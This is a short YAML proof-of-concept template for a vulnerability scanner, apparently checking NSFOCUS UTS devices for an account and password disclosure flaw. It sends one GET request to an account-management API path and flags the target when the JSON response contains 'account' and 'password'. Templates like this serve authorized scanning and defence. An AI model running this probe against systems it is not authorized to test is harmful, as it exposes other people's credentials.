id: poc-yaml-nsfocus-uts-password-leak
info:
  name: Nsfocus Uts 密码泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: Nsfocus Uts
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /webapi/v1/system/accountmanage/account
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "json") && contains(body, "account") && contains(body, "password")
  output: []
